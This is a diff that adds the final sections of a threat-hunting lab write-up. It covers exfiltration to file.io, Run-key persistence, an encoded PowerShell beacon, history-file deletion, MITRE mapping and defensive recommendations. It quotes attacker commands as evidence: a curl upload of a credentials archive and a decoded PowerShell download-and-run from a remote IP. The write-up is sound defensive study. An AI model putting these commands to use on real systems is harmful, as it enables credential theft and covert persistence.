@@ -1617,4 +1617,454 @@ Detection here is critical for timely incident response.
 
 ---
 
-## 
+## FLAG 17 — EXFILTRATION: Cloud Service
+
+###Objective
+
+Determine which cloud service the attacker used as their data exfiltration endpoint.
+
+### Investigation Approach
+
+This flag is a direct follow-up to Flag 16.
+
+We already identified the upload command:
+
+`curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`
+
+
+So the task now is not to discover a new log, but to:
+
+- Extract the service domain from the upload URL
+- Normalize it into the required service.domain format
+
+### Evidence Observed
+
+From the previously confirmed exfil command:
+
+`https://file.io`
+
+Key characteristics:
+
+- Cloud-based ephemeral file hosting
+- No authentication required
+- Lightweight, HTTP-based upload workflow using curl
+
+These traits align perfectly with the investigation brief:
+
+“Attackers favor services that require no authentication and leave minimal traces.”
+
+### Analysis & Interpretation
+
+Using file.io suggests:
+
+- The adversary intends to quickly offload and retrieve data without creating accounts
+- The exfil location is decoupled from their C2 infrastructure
+- It is harder for defenders to do post-incident log correlation, since the organization has no visibility into the cloud provider’s logs
+
+This is a simple but effective approach for smash-and-grab style theft.
+
+### Why This Matters
+
+Identifying the exfil endpoint is essential for:
+
+- Threat intel enrichment
+- Future detection engineering
+- Blocking future exfil attempts at the network or proxy level
+
+It also helps IR teams scope the incident, as they can search for other connections to the same service from other hosts.
+
+### MITRE ATT&CK Mapping
+| Technique Category | Technique                     | ID            |
+| ------------------ | ----------------------------- | ------------- |
+| Exfiltration       | Exfiltration to Cloud Storage | **T1567.002** |
+
+### Final Flag Answer
+`file.io`
+
+---
+
+## FLAG 18 — PERSISTENCE: Registry Value Name
+
+### Objective
+
+Identify the registry autorun value name used by the attacker to ensure their malicious payload executed at every startup or user logon.
+
+### Investigation Approach
+
+After the attacker:
+
+- Staged tooling in a hidden folder
+- Stole and compressed credentials and internal data
+- Successfully exfiltrated the archive
+
+…the next priority was staying in the environment.
+
+We shifted investigation focus to:
+
+- Registry modification telemetry
+- Autostart locations commonly abused, especially:
+```
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+```
+
+We searched for newly created or modified values pointing at suspicious:
+
+- `.ps1` scripts
+- Hidden staging directory paths
+- Non-standard executable names
+
+### Query Used
+
+
+```
+DeviceRegistryEvents
+| where DeviceName == "azuki-fileserver01"
+| where InitiatingProcessAccountName == @"fileadmin"
+| where RegistryKey contains @"\CurrentVersion\Run"
+| where ActionType in ("RegistryValueSet", "RegistryValueCreated")
+| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
+| order by Timestamp asc
+```
+### Evidence Observed
+
+A new Run key value was created by the attacker:
+
+<img width="554" height="155" alt="image" src="https://github.com/user-attachments/assets/a9898d2e-c068-4431-8d8c-8ad48b74eb0c" />
+
+```
+Registry Autorun Entry
+Value Name: FileShareSync
+Points to: A staged malicious script (svchost.ps1)
+Location: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+Device: azuki-fileserver01
+Account: fileadmin
+```
+The value name is chosen to appear legitimate — mimicking enterprise file synchronization services.
+
+### Analysis & Interpretation
+
+This demonstrates the adversary’s intent to:
+
+- Maintain a foothold even after reboot or user logoff
+- Re-establish command execution upon system startup
+- Blend into normal administration tooling with a trustworthy-sounding name
+
+This is long-term persistence, not smash-and-grab.
+
+### Why This Matters
+
+Registry Run-key persistence:
+
+- Launches the payload automatically — no human interaction needed
+- Is commonly missed in rushed triage reviews
+- Would allow attacker re-entry even after credential resets
+
+This entry must be deleted during containment.
+
+### MITRE ATT&CK Mapping
+
+| Category        | Technique                        | ID                        |
+| --------------- | -------------------------------- | ------------------------- |
+| Persistence     | Registry Run Keys / Start Folder | **T1547.001**             |
+| Defense Evasion | Masquerading (legitimate name)   | **T1036.005** *(related)* |
+
+### Final Flag Answer
+`FileShareSync`
+
+---
+
+## FLAG 19 — PERSISTENCE: Beacon Filename
+
+### Objective
+
+Identify the malicious persistence beacon script used to maintain access after reboot, and document how it was delivered and executed.
+
+### Investigation Approach
+
+After detecting the suspicious Run-key persistence value FileShareSync (Flag 18), we pivoted to:
+
+- DeviceProcessEvents → PowerShell execution
+- Encoded command analysis → -Enc <Base64Blob>
+- DeviceFileEvents → Creation of svchost.ps1 in System32
+
+We then Base64-decoded the payload for full visibility into attacker intent.
+
+### Query Used
+
+(report-friendly condensation)
+
+DeviceRegistryEvents
+| where RegistryValueName == "FileShareSync"
+| project RegistryValueData
+
+
+We then pivoted to confirm the file existed:
+
+DeviceFileEvents
+| where FolderPath contains @"C:\Windows\Logs\CBS"
+| where FileName =~ "svchost.ps1"
+
+### Evidence Observed
+
+
+
+```
+Nov 22, 2025 2:04:45 AM
+File: svchost.ps1
+Folder: C:\Windows\System32\svchost.ps1
+Device: azuki-fileserver01
+Initiated by:
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwA3ADgALgAxADQAMQAuADEAOQA2AC4ANgA6ADgAMAA4ADAALwBTAHYAYwBoAG8AcwB0AC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHMAdgBjAGgAbwBzAHQALgBwAHMAMQAiAA==
+```
+Decoded Payload
+```Invoke-WebRequest -Uri "http://78.141.196.6:8080/Svchost.ps1" -OutFile "C:\Windows\System32\svchost.ps1"```
+
+Resulting Artifact
+`C:\Windows\System32\svchost.ps1`
+
+
+| Flag           | Meaning                                         |
+| -------------- | ----------------------------------------------- |
+| `-NoP`         | Don’t load extra profiles — stealthier startup  |
+| `-NonI`        | Non-interactive — avoids terminal display       |
+| `-W Hidden`    | No visible window — hides user evidence         |
+| `-Exec Bypass` | Ignore PowerShell execution policy restrictions |
+| `-Enc`         | Encoded payload — obfuscates command content    |
+
+This shows active beacon launch under stealth and evasion.
+
+### Analysis & Interpretation
+
+This confirms:
+
+| Tactic                     | Description                                                |
+| -------------------------- | ---------------------------------------------------------- |
+| **Ingress Tool Transfer**  | Beacon downloaded directly from attacker C2                |
+| **Masquerading**           | Named `svchost.ps1` to mimic a core Windows binary         |
+| **Trusted Location Abuse** | Dropped into `System32` for stealth + ACL inheritance      |
+| **Registry Autostart**     | Triggered by `FileShareSync` run key to ensure persistence |
+| **Encoded Execution**      | Designed to evade script-based detection rules             |
+
+
+This is not a leftover tool — it is the active foothold enabling:
+
+- Re-entry after reboot
+- Reloading new payloads
+- Recon/exfil from a fresh process
+- Long-term control inside the environment
+
+### Why This Matters
+
+This persistence mechanism is the true backdoor.
+Even if:
+
+- Passwords are reset
+- Initial access vectors are remediated
+- The staging directory is quarantined
+
+…the attacker can still reconnect and resume operations.
+
+This file and its registry linkage must be removed for complete eradication.
+
+### MITRE ATT&CK Mapping 
+
+| Phase             | Technique                             | ID            |
+| ----------------- | ------------------------------------- | ------------- |
+| Persistence       | Registry Run Keys / Startup Execution | **T1547.001** |
+| Persistence       | Masquerading as Legitimate Component  | **T1036.005** |
+| Execution         | PowerShell                            | **T1059.001** |
+| Defense Evasion   | Obfuscated/Encoded Commands           | **T1027.010** |
+| Command & Control | Ingress Tool Transfer                 | **T1105**     |
+
+
+### Final Flag Answer
+`svchost.ps1`
+
+---
+
+## FLAG 20 — ANTI-FORENSICS: PowerShell History File Deletion
+
+### Objective
+
+Identify which file the attacker deleted to remove evidence of prior PowerShell activity — specifically the command history used in interactive sessions.
+
+### Investigation Approach
+
+Following:
+
+- Credential theft
+- Data staging & compression
+- Exfiltration to file.io
+- Persistence deployment in System32
+
+…the attacker shifted into cover-your-tracks mode.
+
+We pivoted into:
+
+* `DeviceFileEvents`
+
+* Filtering for file deletion actions within:
+    - User profile directories
+    - PSReadLine history path
+
+PowerShell logs interactive command history to a persistent file, making it a top target for anti-forensics.
+
+### Query Used
+
+```
+DeviceFileEvents
+| where DeviceName == "azuki-fileserver01"
+| where InitiatingProcessAccountName == @"fileadmin"
+| where ActionType == "FileDeleted"
+| where FileName contains "history"
+| project Timestamp, DeviceName, AccountName, FileName, FolderPath
+| order by Timestamp asc
+```
+
+This surfaced a very specific forensic indicator.
+
+### Evidence Observed
+
+<img width="698" height="134" alt="image" src="https://github.com/user-attachments/assets/0929d4f4-6ecf-4b6a-8b18-c244badc3e2f" />
+
+
+```
+Nov 22, 2025 ~2:26 AM
+Device: azuki-fileserver01
+File Deleted: ConsoleHost_history.txt
+Path:
+C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+This is the PowerShell command history file — used to log exactly the kinds of commands executed throughout the attack:
+
+- certutil tool download
+- xcopy share replication
+- tar compression
+- encoded PowerShell persistence staging
+- curl exfiltration
+
+By deleting it, the attacker removed the primary artifact proving those commands were launched interactively.
+
+### Analysis & Interpretation
+| Behavior                         | Intent                         |
+| -------------------------------- | ------------------------------ |
+| Selective, targeted file removal | Hide the operator’s presence   |
+| Post-exfil execution             | Prevent IR reconstruction      |
+| Deletes only behavioral logs     | Retains functional persistence |
+
+
+This is not endpoint clutter cleanup — it is an adversary consciously targeting a key forensic log.
+
+It is the final action in the operational stage of the breach.
+
+### Why This Matters
+
+PowerShell history deletion directly obstructs:
+
+- Timeline reconstruction
+- Analyst ability to tie commands to human operator actions
+- Identification of the source tooling and C2 behaviors
+
+This is a textbook Anti-Forensic technique, seen in targeted intrusions.
+
+### MITRE ATT&CK Mapping
+| Phase           | Technique                 | ID            |
+| --------------- | ------------------------- | ------------- |
+| Defense Evasion | Clear Command History     | **T1070.003** |
+| Defense Evasion | Indicator Removal on Host | **T1070**     |
+
+
+### Final Flag Answer
+`ConsoleHost_history.txt`
+
+---
+
+# MITRE ATT&CK Mapping
+
+## Full Technique Coverage Across the Kill Chain
+
+| Flag | Tactic                | Technique                              |               ATT&CK ID               |
+| ---: | --------------------- | -------------------------------------- | :-----------------------------------: |
+|    1 | Initial Access        | Valid Accounts (return access)         |               **T1078**               |
+|    2 | Lateral Movement      | Remote Services (RDP)                  |               **T1021**               |
+|    3 | Credential Access     | Valid Accounts (privileged)            |               **T1078**               |
+|    4 | Discovery             | Network Share Discovery – Local        |               **T1135**               |
+|    5 | Discovery             | Network Share Discovery – Remote       |               **T1135**               |
+|    6 | Discovery             | System Owner/User Discovery            |               **T1033**               |
+|    7 | Discovery             | System Network Configuration Discovery |               **T1016**               |
+|    8 | Defense Evasion       | Hidden Files and Directories           |             **T1564.001**             |
+|    9 | Collection            | Local Data Staging                     |             **T1074.001**             |
+|   10 | Ingress Tool Transfer | Download via LOLBin (certutil)         |               **T1105**               |
+|   11 | Credential Access     | Credentials Stored in Files            |               **T1552**               |
+|   12 | Collection            | Automated Collection (xcopy)           |               **T1119**               |
+|   13 | Collection            | Archive Collected Data                 |             **T1560.001**             |
+|   14 | Defense Evasion       | Masquerading Rename                    |             **T1036.003**             |
+|   15 | Credential Access     | LSASS Memory Dump                      |             **T1003.001**             |
+|   16 | Exfiltration          | Exfiltration Over Web Service          |               **T1567**               |
+|   17 | Exfiltration          | Exfiltration to Cloud Storage          |             **T1567.002**             |
+|   18 | Persistence           | Registry Run Keys                      |             **T1547.001**             |
+|   19 | Persistence / Exec    | Encoded PowerShell + Masquerading      | **T1059.001 / T1036.005 / T1027.010** |
+|   20 | Defense Evasion       | Clear Command History                  |             **T1070.003**             |
+
+---
+
+# After-Action Recommendations
+
+## SOC-focused Mitigation Plan
+
+| Impact Area          | Action                                                                                      |   Priority  |
+| -------------------- | ------------------------------------------------------------------------------------------- | :---------: |
+| Persistence removal  | Delete `FileShareSync` Run-Key & `svchost.ps1`                                              |   🔴 High   |
+| Credential integrity | Reset credentials associated with **fileadmin** and any accounts appearing in **lsass.dmp** |   🔴 High   |
+| Endpoint hardening   | Disable/limit RDP where not required                                                        |   🔴 High   |
+| Monitoring & hunting | Alert on: `certutil`, `curl`, `Invoke-WebRequest`, `Base64 encoded PowerShell`              |  🟠 Medium  |
+| Share access review  | Enforce **least privilege** on file shares                                                  |  🟠 Medium  |
+| Network controls     | Block outbound uploads to **file.io** and similar anonymized file hosts                     |  🟠 Medium  |
+| Logging retention    | Preserve security logs for correlation and legal chain-of-custody                           | 🟢 Standard |
+
+## Detection Engineering Rules of Thumb
+
+### Alert when all are true:
+
+- Built-in binaries (`certutil, curl.exe, tar.exe, xcopy.exe`)
+
+- Executed from non-standard paths
+
+- Accesses sensitive directories (System32 / hidden log paths)
+
+- Performs network transfers (HTTP POST / uploads)
+
+### Add behavioral detection for:
+
+- `-Exec Bypass`
+
+- `-W Hidden`
+
+- `-Enc *`
+
+- Creation of `.dmp` under `C:\Windows\Logs\`
+
+- Run-Key modifications launching `.ps1` from System32
+
+---
+
+# Conclusion
+
+This investigation successfully reconstructed a complete targeted intrusion using nothing but Microsoft Defender for Endpoint telemetry and KQL hunting.
+The adversary demonstrated:
+
+- Valid credential abuse
+- Data discovery inside the domain
+- Credential theft from LSASS
+- Privileged file share staging
+- Compression & successful exfiltration of sensitive data
+- Reliable persistence via masquerading beacon
+- Final anti-forensic cleanup
+
+Analysis:
+
+- Identified every major action in the kill chain
+- Extracted actionable IOCs
+- Produced a timeline, MITRE mapping, and threat intel quality reporting
+- Demonstrated strong threat-hunting skills using MDE+KQL
